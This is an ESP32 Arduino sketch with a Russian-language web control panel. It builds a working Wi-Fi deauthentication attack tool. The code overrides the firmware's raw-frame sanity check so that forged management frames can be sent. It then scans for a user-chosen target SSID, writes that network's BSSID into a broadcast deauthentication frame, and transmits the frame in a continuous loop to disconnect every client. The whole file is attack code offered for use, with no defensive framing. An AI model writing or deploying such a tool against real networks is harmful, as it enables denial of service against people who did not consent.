#define BUTTON 0
#define LED 2

#include <WiFi.h>
#include "esp_wifi.h"
#include <WebServer.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t, int32_t) {
    return (arg == 31337) ? 1 : 0;
}

const char* AP_SSID = "ESP32_DEAUTH";
const char* AP_PASS = "12345678";

String TARGET_SSID = "ENTERNAMEOFWIFI";

bool targetAcquired = false;
uint8_t targetBssid[6];
bool ledState = false;
int mode = 0;
unsigned long lastBlink = 0;

String lastTargetSSID = "";
String lastTargetBSSID = "";
unsigned long deauthCount = 0;
unsigned long attackStartTime = 0;
bool attackRunning = false;

WebServer server(80);

unsigned long lastButtonChange = 0;
int lastButtonReading = HIGH;
int stableButtonState = HIGH;
const unsigned long DEBOUNCE_MS = 50;

bool scanInProgress = false;
unsigned long scanStartMs = 0;
const unsigned long SCAN_TIMEOUT_MS = 8000; 

const int PACKETS_PER_LOOP = 1; 

uint8_t deauthPacket[26] = {
  0xA0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x08, 0x00
};

bool checkButton() {
  int reading = digitalRead(BUTTON);
  bool pressed = false;

  if (reading != lastButtonReading) {
    lastButtonChange = millis();
    lastButtonReading = reading;
  }

  if ((millis() - lastButtonChange) > DEBOUNCE_MS) {
    if (reading != stableButtonState) {
      stableButtonState = reading;
      if (stableButtonState == LOW) {
        pressed = true; 
      }
    }
  }
  return pressed;
}

String getHTML() {
  String html = "<!DOCTYPE html><html><head><meta charset='utf-8'>";
  html += "<title>ESP32 Deauth Monitor</title>";
  html += "<style>";
  html += "body{font-family:Arial;background:#111;color:#0f0;padding:20px;}";
  html += "h1{color:#f00;}table{border-collapse:collapse;margin-top:10px;}";
  html += "td,th{border:1px solid #0f0;padding:8px 15px;}";
  html += "a{color:#0ff;}";
  html += "form{margin-top:20px;padding:15px;border:1px solid #0f0;}";
  html += "input[type=text]{background:#000;color:#0f0;border:1px solid #0f0;padding:6px;width:250px;}";
  html += "input[type=submit]{background:#0f0;color:#000;border:none;padding:6px 15px;cursor:pointer;font-weight:bold;}";
  html += "</style></head><body>";
  html += "<h1>ESP32 Deauth Monitor</h1>";

  html += "<form method='POST' action='/settarget'>";
  html += "<label>Целевой SSID: </label>";
  html += "<input type='text' name='ssid' value='" + TARGET_SSID + "' maxlength='32' required>";
  html += "<input type='submit' value='Сменить цель'>";
  html += "</form>";

  html += "<table>";
  html += "<tr><th>Параметр</th><th>Значение</th></tr>";
  html += "<tr><td>Режим</td><td>" + String(mode == 1 ? "АТАКА" : "ОЖИДАНИЕ") + "</td></tr>";
  html += "<tr><td>Текущая цель</td><td>" + TARGET_SSID + "</td></tr>";
  html += "<tr><td>Найденный SSID</td><td>" + lastTargetSSID + "</td></tr>";
  html += "<tr><td>BSSID цели</td><td>" + lastTargetBSSID + "</td></tr>";
  html += "<tr><td>Цель захвачена</td><td>" + String(targetAcquired ? "ДА" : "НЕТ") + "</td></tr>";
  html += "<tr><td>Сканирование</td><td>" + String(scanInProgress ? "ИДЁТ" : "НЕТ") + "</td></tr>";
  html += "<tr><td>Отправлено пакетов</td><td>" + String(deauthCount) + "</td></tr>";
  html += "<tr><td>Время атаки (сек)</td><td>" +
          String(attackRunning ? (millis() - attackStartTime) / 1000 : 0) + "</td></tr>";
  html += "<tr><td>Uptime (сек)</td><td>" + String(millis() / 1000) + "</td></tr>";
  html += "<tr><td>IP точки доступа</td><td>" + WiFi.softAPIP().toString() + "</td></tr>";
  html += "<tr><td>Клиентов на AP</td><td>" + String(WiFi.softAPgetStationNum()) + "</td></tr>";
  html += "</table>";
  html += "<p><a href='/'>Обновить вручную</a></p>";
  html += "</body></html>";
  return html;
}

void sendDeauthChunk(uint8_t* bssid) {
  memcpy(&deauthPacket[10], bssid, 6); 
  memcpy(&deauthPacket[16], bssid, 6); 

  for (int i = 0; i < PACKETS_PER_LOOP; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    deauthCount++;
  }
}

void startScan() {
  if (scanInProgress) return;

  Serial.println("Запуск сканирования...");
  WiFi.scanDelete();
  int16_t res = WiFi.scanNetworks(true);
  if (res == WIFI_SCAN_FAILED) {
    Serial.println("Не удалось запустить сканирование");
    return;
  }
  scanInProgress = true;
  scanStartMs = millis();
}

bool pollScanResult() {
  if (!scanInProgress) return false;

  int16_t n = WiFi.scanComplete();

  if (n == WIFI_SCAN_RUNNING) {
    if (millis() - scanStartMs > SCAN_TIMEOUT_MS) {
      Serial.println("Таймаут сканирования, прерываю");
      WiFi.scanDelete();
      scanInProgress = false;
    }
    return false;
  }

  if (n == WIFI_SCAN_FAILED) {
    Serial.println("Сканирование не удалось");
    scanInProgress = false;
    return false;
  }

  Serial.printf("Найдено сетей: %d\n", n);

  bool found = false;
  for (int i = 0; i < n; i++) {
    if (WiFi.SSID(i) == TARGET_SSID) {
      memcpy(targetBssid, WiFi.BSSID(i), 6);
      lastTargetSSID = WiFi.SSID(i);
      lastTargetBSSID = WiFi.BSSIDstr(i);

      Serial.print("Цель найдена: ");
      Serial.print(WiFi.SSID(i));
      Serial.print("  BSSID: ");
      Serial.println(WiFi.BSSIDstr(i));

      targetAcquired = true;
      found = true;

      attackStartTime = millis();
      attackRunning = true;
      deauthCount = 0;
      break;
    }
  }

  if (!found) {
    Serial.print("Сеть ");
    Serial.print(TARGET_SSID);
    Serial.println(" не найдена");
  }

  WiFi.scanDelete();
  scanInProgress = false;
  return found;
}

void stopAttack() {
  if (!targetAcquired && !attackRunning && !scanInProgress) return;

  targetAcquired = false;
  attackRunning = false;
  if (scanInProgress) {
    WiFi.scanDelete();
    scanInProgress = false;
  }

  Serial.println("Атака остановлена");
}

void setup() {
  pinMode(BUTTON, INPUT_PULLUP);
  pinMode(LED, OUTPUT);
  Serial.begin(115200);
  delay(200);

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(AP_SSID, AP_PASS);
  delay(500);

  Serial.println("=== ESP32 Deauth Monitor ===");
  Serial.print("AP SSID: ");
  Serial.println(AP_SSID);
  Serial.print("AP IP:   ");
  Serial.println(WiFi.softAPIP());

  WiFi.disconnect();
  delay(200);

  server.on("/", []() {
    server.send(200, "text/html; charset=utf-8", getHTML());
  });

  server.on("/settarget", HTTP_POST, []() {
    if (!server.hasArg("ssid")) {
      server.send(400, "text/plain; charset=utf-8", "Не передан параметр ssid");
      return;
    }

    String newSsid = server.arg("ssid");
    newSsid.trim();

    if (newSsid.length() == 0 || newSsid.length() > 32) {
      server.send(400, "text/plain; charset=utf-8", "Некорректная длина SSID (1..32)");
      return;
    }

    TARGET_SSID = newSsid;

    targetAcquired = false;
    attackRunning = false;
    lastTargetSSID = "";
    lastTargetBSSID = "";
    deauthCount = 0;

    if (scanInProgress) {
      WiFi.scanDelete();
      scanInProgress = false;
    }

    Serial.print("Новая цель: ");
    Serial.println(TARGET_SSID);

    server.sendHeader("Location", "/");
    server.send(303);
  });

  server.on("/status", []() {
    String json = "{";
    json += "\"mode\":" + String(mode) + ",";
    json += "\"target_ssid\":\"" + TARGET_SSID + "\",";
    json += "\"target_acquired\":" + String(targetAcquired ? "true" : "false") + ",";
    json += "\"scan_in_progress\":" + String(scanInProgress ? "true" : "false") + ",";
    json += "\"deauth_count\":" + String(deauthCount) + ",";
    json += "\"attack_running\":" + String(attackRunning ? "true" : "false") + ",";
    json += "\"uptime\":" + String(millis() / 1000);
    json += "}";
    server.send(200, "application/json", json);
  });

  server.begin();
  Serial.println("HTTP-сервер запущен на порту 80");
}


void loop() {
  server.handleClient();

  if (checkButton()) {
    if (mode == 0) {
      mode = 1;
      digitalWrite(LED, HIGH);
      Serial.println("Режим: АТАКА");
    } else {
      mode = 0;
      digitalWrite(LED, LOW);
      Serial.println("Режим: ОЖИДАНИЕ");
      stopAttack();
    }
  }

  if (mode == 1) {
    if (!targetAcquired) {
      if (!scanInProgress) {
        startScan();
      } else {
        pollScanResult();
      }
    } else {
      sendDeauthChunk(targetBssid);
    }
  }

  delay(2);
}
